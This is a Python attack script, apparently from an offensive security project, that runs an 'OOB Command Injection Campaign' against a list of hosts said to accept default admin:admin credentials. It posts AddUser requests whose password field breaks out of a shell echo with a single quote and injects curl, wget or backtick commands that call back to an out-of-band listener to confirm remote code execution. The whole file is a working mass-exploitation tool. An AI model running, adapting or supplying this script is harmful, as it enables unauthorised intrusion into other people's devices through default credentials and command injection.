#!/usr/bin/env python3
"""
[REDACTED-ID]_006: addSSLUserPassword() OOB Command Injection Campaign
Tests ADDUSER password injection with OOB callback against all default-cred hosts.

Payload: Single-quote breaks echo context, $(curl) triggers OOB callback
Format: echo -E 'username:PAYLOAD' | openssl aes-256-cbc ...
"""
import requests
import json
import time
import sys
import urllib3
import base64
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OOB_HOST = "[REDACTED-IP]"
OOB_PORT = 80
TIMEOUT = 45  # seconds - ADDUSER typically times out at ~30.2s
RESULTS_FILE = "/tmp/cf4_006_injection_results.log"

# Hosts from DefaultCredsAll.txt (admin:admin, clean entries only)
HOSTS_FILE = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-PROJECT]/[REDACTED-ID]_Crestron_FW3x/scripts/DefaultCredsAll.txt"

def get_hosts():
    """Extract clean admin:admin hosts"""
    hosts = []
    with open(HOSTS_FILE) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if "admin:admin" not in line:
                continue
            if "DOCTYPE" in line or "<html" in line or "recaptcha" in line:
                continue
            ip = line.split("|")[0].strip()
            hosts.append(ip)
    return hosts

def make_payload(target_ip):
    """Generate injection payload with target-specific OOB path"""
    tag = hashlib.md5(target_ip.encode()).hexdigest()[:8]
    # Primary payload: single-quote breakout + curl OOB
    password = f"test'$(curl http://{OOB_HOST}:{OOB_PORT}/cf4006/{tag}/{target_ip})'"
    return password, tag

def make_payload_wget(target_ip):
    """Alternative payload using wget instead of curl"""
    tag = hashlib.md5(target_ip.encode()).hexdigest()[:8]
    password = f"test'$(wget -qO- http://{OOB_HOST}:{OOB_PORT}/cf4006w/{tag}/{target_ip})'"
    return password, tag

def make_payload_backtick(target_ip):
    """Alternative payload using backtick substitution"""
    tag = hashlib.md5(target_ip.encode()).hexdigest()[:8]
    password = f"test'`curl http://{OOB_HOST}:{OOB_PORT}/cf4006b/{tag}/{target_ip}`'"
    return password, tag

def try_injection(host, username, password, creds="admin:admin"):
    """Send ADDUSER injection request"""
    url = f"https://{host}/Device"
    auth_user, auth_pass = creds.split(":")

    body = {
        "Device": {
            "Authentication": {
                "AddUser": {
                    "UserName": username,
                    "Password": password
                }
            }
        }
    }

    headers = {
        "Content-Type": "application/json",
        "Authorization": "Basic " + base64.b64encode(f"{auth_user}:{auth_pass}".encode()).decode()
    }

    try:
        start = time.time()
        resp = requests.post(url, json=body, headers=headers, verify=False, timeout=TIMEOUT)
        elapsed = time.time() - start
        return {
            "status_code": resp.status_code,
            "elapsed": round(elapsed, 2),
            "body": resp.text[:500],
            "error": None
        }
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        return {
            "status_code": None,
            "elapsed": round(elapsed, 2),
            "body": None,
            "error": "TIMEOUT"
        }
    except requests.exceptions.ConnectionError as e:
        return {
            "status_code": None,
            "elapsed": 0,
            "body": None,
            "error": f"CONNECTION_ERROR: {str(e)[:100]}"
        }
    except Exception as e:
        return {
            "status_code": None,
            "elapsed": 0,
            "body": None,
            "error": f"ERROR: {str(e)[:100]}"
        }

def log_result(msg):
    """Log to both stdout and results file"""
    print(msg, flush=True)
    with open(RESULTS_FILE, "a") as f:
        f.write(msg + "\n")

def main():
    hosts = get_hosts()
    log_result(f"[*] [REDACTED-ID]_006 OOB Injection Campaign")
    log_result(f"[*] OOB Listener: http://{OOB_HOST}:{OOB_PORT}")
    log_result(f"[*] Target hosts: {len(hosts)}")
    log_result(f"[*] Timeout per request: {TIMEOUT}s")
    log_result(f"[*] Results: {RESULTS_FILE}")
    log_result(f"[*] OOB log: tail -f /tmp/cf4_oob_listener.log")
    log_result(f"[*] Started: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
    log_result("=" * 80)

    # Test payloads in order of likelihood
    payloads = [
        ("curl_subst", make_payload),
        ("wget_subst", make_payload_wget),
        ("backtick", make_payload_backtick),
    ]

    tested = 0
    timeouts = 0
    errors = 0

    for i, host in enumerate(hosts):
        log_result(f"\n[{i+1}/{len(hosts)}] Testing {host}")

        for payload_name, payload_fn in payloads:
            password, tag = payload_fn(host)
            username = f"cf4t{tag[:4]}"

            log_result(f"  [{payload_name}] user={username} tag={tag}")
            result = try_injection(host, username, password)
            tested += 1

            if result["error"] == "TIMEOUT":
                timeouts += 1
                log_result(f"  [{payload_name}] TIMEOUT after {result['elapsed']}s (CTP dispatched, awaiting OOB)")
            elif result["error"]:
                errors += 1
                log_result(f"  [{payload_name}] {result['error']}")
                if "CONNECTION_ERROR" in str(result["error"]):
                    log_result(f"  Skipping remaining payloads for {host} (unreachable)")
                    break
            else:
                status = result["status_code"]
                elapsed = result["elapsed"]
                body_preview = (result["body"] or "")[:200]
                log_result(f"  [{payload_name}] HTTP {status} in {elapsed}s")

                # Quick response = likely rejected or returned state
                if elapsed < 5:
                    log_result(f"  Quick response — may not have dispatched CTP")
                elif elapsed > 25:
                    log_result(f"  Long response ({elapsed}s) — CTP likely dispatched, awaiting OOB")

                if "StatusId" in body_preview:
                    log_result(f"  Response: {body_preview}")

            # Small delay between payloads to same host
            time.sleep(0.5)

        # Brief pause between hosts
        time.sleep(0.3)

    log_result("\n" + "=" * 80)
    log_result(f"[*] Campaign complete: {tested} requests, {timeouts} timeouts, {errors} errors")
    log_result(f"[*] CHECK OOB LOG: tail -f /tmp/cf4_oob_listener.log")
    log_result(f"[*] Any callback means confirmed RCE!")
    log_result(f"[*] Finished: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")

if __name__ == "__main__":
    main()
